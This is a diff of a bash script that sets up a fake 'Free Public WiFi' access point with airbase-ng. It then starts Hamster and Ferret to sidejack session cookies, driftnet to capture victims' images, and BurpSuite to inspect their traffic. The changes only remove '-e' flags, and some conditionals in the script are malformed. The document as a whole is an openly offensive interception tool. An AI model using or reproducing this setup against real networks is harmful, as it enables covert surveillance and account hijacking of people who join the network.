@@ -25,20 +25,20 @@ selectWirelessInterface () {
     cat /tmp/ethlist
     echo ""
     echo "-------------------------------------------------"
-    read -p "What interface will you choose for the fake AP? " -e wlan 
+    read -p "What interface will you choose for the fake AP? " wlan 
     rm /tmp/ethlist
 }
 
 # Start networking (if selected)
 network () {
-    read -p "Start networking [Y/N]? " -e answer
+    read -p "Start networking [Y/N]? " answer
     if [ "$answer" = "Y" && "$answer" = "y"] ; then
         service networking start > /dev/null 2>&1
     elif ["$answer" = "N" && "$answer" = "n"] ; then
 	exit 0
     fi
     selectWirelessInterface
-    read -p "External USB WLAN present [Y/N]? " -e ext
+    read -p "External USB WLAN present [Y/N]? " ext
     if [ "$ext" = "Y" ] ; then
        ifconfig $wlan up > /dev/null 2>&1
     fi
@@ -59,17 +59,17 @@ monitor () {
 # Fire up the fake access point
 createAP () {
     nameap="Free Public WiFi"
-    read -p "Use default ESSID [Free Public WiFi][Y/N]? " -e defuse 
+    read -p "Use default ESSID [Free Public WiFi][Y/N]? " defuse 
     if [ $defuse = "N" ] ; then
-        read -p "What will the AP name be? " -e nameap
+        read -p "What will the AP name be? " nameap
     fi
-    read -p "Start Access Point [Y/N]? " -e prom 
+    read -p "Start Access Point [Y/N]? " prom 
     echo "AP name will be $nameap"
     echo -n "Starting fake AP...                  "
     if [ $prom = "Y" ] ; then
-        airbase-ng -P -e $nameap $monintme > /tmp/ap_access_list &
+        airbase-ng -P $nameap $monintme > /tmp/ap_access_list &
     else
-        airbase-ng -e $nameap $monintme > /tmp/ap_access_list &
+        airbase-ng $nameap $monintme > /tmp/ap_access_list &
     fi
     sleep 10 
     echo "DONE"
@@ -103,19 +103,19 @@ routing () {
 
 # Fire up evil rodents
 startRodents () {
-    read -p "Start Hamster [Y/N]? " -e starthammy
+    read -p "Start Hamster [Y/N]? " starthammy
     if [ $starthammy = "Y" ] ; then
         echo -n "Starting Hamster...                  "
         /pentest/sniffers/hamster/hamster &
         echo "DONE"
     fi
-    read -p "Start Ferret [Y/N]? " -e startferry
+    read -p "Start Ferret [Y/N]? " startferry
     if [ $startferry = "Y" ] ; then
         echo -n "Starting Ferret...                   "
         /pentest/sniffers/hamster/ferret -i at0 &
         echo "DONE"
     fi
-    read -p "Do you want to launch the Hamster web interface [Y/N]? " -e hamweb
+    read -p "Do you want to launch the Hamster web interface [Y/N]? " hamweb
     if [ $hamweb = "Y" ] ; then
         /usr/bin/firefox 127.0.0.1:1234
     fi
@@ -123,9 +123,9 @@ startRodents () {
 
 # Capture all image traffic across the network
 captureImages () {
-    read -p "Start driftnet [Y/N]? " -e startdrift
+    read -p "Start driftnet [Y/N]? " startdrift
     if [ $startdrift = "Y" ] ; then
-        read -p "Capture images [Y/N]? " -e answer
+        read -p "Capture images [Y/N]? " answer
         echo -n "Starting driftnet...                 "
         if [ $answer = "Y" ] ; then
             driftnet -i at0 -a -d /tmp/driftimages
@@ -140,7 +140,7 @@ captureImages () {
 
 # Start BurpSuite to perform detailed packet analysis
 startBurp () {
-    read -p "Start BurpSuite [Y/N]? " -e burpstart
+    read -p "Start BurpSuite [Y/N]? " burpstart
     if [ $burpstart = "Y" ] ; then
         echo -n "Starting BurpSuite...               "
             /root/burpme.sh > /dev/null 2>&1
@@ -156,7 +156,7 @@ echo "--------------------------------------------------------------------------
 network
 
 echo "Get external internet access now, then"
-read -p "press Enter to continue." -e throwaway
+read -p "press Enter to continue." throwaway
 
 echo
 
